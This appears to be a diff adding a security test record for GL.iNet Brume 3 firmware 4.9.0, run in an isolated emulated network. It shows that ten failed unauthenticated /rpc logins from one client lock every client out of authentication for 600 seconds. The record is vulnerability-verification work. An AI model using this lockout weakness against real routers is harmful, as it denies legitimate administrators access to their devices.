@@ -1,0 +1,57 @@
+GL.iNet GL-MT5000 Brume 3 firmware 4.9.0
+End-to-end native HTTP-stack emulation
+Date: 2026-07-24
+
+Firmware:
+  version: 4.9.0
+  sha256: e69e440c2715122793e2a4229d1acab3fbcfd193532e9167cd2f4d57bfbfe2d9
+
+Native AArch64 components:
+  /usr/sbin/nginx -c /etc/nginx/oui_nginx.conf
+  /sbin/ubusd
+  /usr/bin/eco
+  /usr/sbin/gl-ngx-session
+  shipped Nginx Lua /rpc handlers and Ubus proxy
+
+Isolation:
+  internal-only Docker network
+  no host ports published
+  emulated router: 172.20.0.2
+  client A: 172.20.0.3
+  client B: 172.20.0.4
+
+Client B baseline POST /rpc root challenge:
+{"id":100,"jsonrpc":"2.0","result":{"hash-method":"sha256","alg":6,"salt":"friday49","nonce":"LxVJLfEd03usvupTT7Qu4NfYCZRCYhqM"}}
+
+Client A trigger:
+attempt=1 {"id":1,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=2 {"id":2,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=3 {"id":3,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=4 {"id":4,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=5 {"id":5,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=6 {"id":6,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=7 {"id":7,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=8 {"id":8,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=9 {"id":9,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+attempt=10 {"id":10,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+
+Client B root challenge after client A trigger:
+{"id":200,"jsonrpc":"2.0","error":{"message":"Login fail number over limit","data":{"wait":600},"code":-32003}}
+
+Client B correct-hash login during lockout:
+{"id":201,"jsonrpc":"2.0","error":{"message":"Login fail number over limit","data":{"wait":572},"code":-32003}}
+
+Client B ordinary HTTP health during lockout:
+status=200 time=0.044439
+
+Native service state during lockout:
+  ubusd: running
+  gl-ngx-session: running
+  nginx: running
+
+Conclusion:
+Firmware 4.9.0 is dynamically confirmed affected through its real
+network-facing HTTP JSON-RPC path. Ten unauthenticated failures from client A
+globally deny correct authentication from distinct client B for 600 seconds.
+The HTTP service remains responsive, narrowing impact to authentication-plane
+availability.
